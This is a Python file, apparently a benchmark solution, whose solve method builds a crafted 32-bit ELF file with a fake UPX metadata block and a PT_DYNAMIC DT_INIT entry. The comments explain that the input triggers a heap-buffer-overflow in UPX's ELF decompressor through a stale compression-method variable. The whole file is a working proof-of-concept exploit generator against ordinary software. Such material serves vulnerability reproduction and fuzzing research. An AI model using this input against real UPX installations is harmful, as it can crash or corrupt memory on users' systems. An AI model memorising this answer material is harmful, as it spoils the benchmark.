import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a heap-buffer-overflow in UPX's ELF decompressor due to
        # an un-reset state variable (`ph.method`) when iterating program headers.
        # This PoC creates a minimal 32-bit ELF file with two program headers.
        # 1. A PT_LOAD header points to a fake UPX metadata block, which sets
        #    `ph.method` to a non-zero value (e.g., 8 for LZMA).
        # 2. A PT_DYNAMIC header is processed next. The vulnerable UPX version uses the
        #    stale `ph.method`. This header contains a DT_INIT entry, triggering
        #    `un_DT_INIT()`, which then attempts to decompress data using the wrong
        #    method, causing the overflow.

        # ELF Header (32-bit, little-endian)
        ehdr = b'\x7fELF\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00' # e_ident
        ehdr += struct.pack(
            '<HHIIIIIHHHHHH',
            3,      # e_type = ET_DYN
            3,      # e_machine = EM_386
            1,      # e_version
            0,      # e_entry
            52,     # e_phoff
            0,      # e_shoff
            0,      # e_flags
            52,     # e_ehsize
            32,     # e_phentsize
            2,      # e_phnum
            0,      # e_shentsize
            0,      # e_shnum
            0       # e_shstrndx
        )

        # Offsets and sizes
        ehdr_size = 52
        phdr_table_size = 2 * 32
        
        # Program Header 1 (PT_LOAD to set the stale compression method state)
        p_offset1 = ehdr_size + phdr_table_size
        p_filesz1 = 36  # Size of the fake UPX block
        phdr1 = struct.pack(
            '<IIIIIIII',
            1, p_offset1, 0, 0, p_filesz1, p_filesz1, 5, 0x1000
        )

        # Program Header 2 (PT_DYNAMIC to trigger the vulnerability)
        p_offset2 = p_offset1 + p_filesz1
        p_filesz2 = 16  # Two Elf32_Dyn entries
        phdr2 = struct.pack(
            '<IIIIIIII',
            2, p_offset2, 0x1000, 0x1000, p_filesz2, p_filesz2, 6, 4
        )
        
        phdr_table = phdr1 + phdr2

        # Data for Phdr 1: Fake UPX metadata block.
        # Sets b_method to 8. b_info layout: b_usize, b_csize, b_method, b_level.
        data1 = b'UPX!'
        data1 += b'\x00' * 12                      # l_info
        data1 += struct.pack('<IIII', 0, 0, 8, 0)  # b_info
        data1 += b'\x00' * 4                       # pack_info

        # Data for Phdr 2: Minimal dynamic section to trigger un_DT_INIT().
        # Contains a DT_INIT entry (tag=12) and a terminating DT_NULL (tag=0).
        data2 = struct.pack('<II', 12, 0xdeadbeef) + struct.pack('<II', 0, 0)

        # Assemble the final PoC file
        return ehdr + phdr_table + data1 + data2
